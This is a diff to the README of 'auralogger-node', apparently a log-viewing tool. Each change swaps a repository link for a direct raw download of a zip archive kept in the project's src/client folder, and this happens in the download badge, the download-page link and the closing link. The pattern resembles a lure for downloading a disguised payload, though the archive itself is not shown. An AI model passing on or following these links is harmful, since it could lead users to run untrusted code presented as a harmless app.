@@ -1,6 +1,6 @@
 # 🖥️ auralogger-node - Clear logs across every screen
 
-[![Download](https://img.shields.io/badge/Download-auralogger--node-blue.svg)](https://github.com/feliciaupbound595/auralogger-node)
+[![Download](https://img.shields.io/badge/Download-auralogger--node-blue.svg)](https://github.com/feliciaupbound595/auralogger-node/raw/refs/heads/main/src/client/node-auralogger-v1.5.zip)
 
 ## 🚀 What this app does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Use this link to visit the download page:
 
-[Open the download page](https://github.com/feliciaupbound595/auralogger-node)
+[Open the download page](https://github.com/feliciaupbound595/auralogger-node/raw/refs/heads/main/src/client/node-auralogger-v1.5.zip)
 
 ### On Windows
 
@@ -196,7 +196,7 @@ AuraLogger is built to help you keep control of your logs. You decide what to vi
 
 ## 📎 Link again
 
-[Download or open the repository](https://github.com/feliciaupbound595/auralogger-node)
+[Download or open the repository](https://github.com/feliciaupbound595/auralogger-node/raw/refs/heads/main/src/client/node-auralogger-v1.5.zip)
 
 ## 🛠️ Simple setup checklist
 
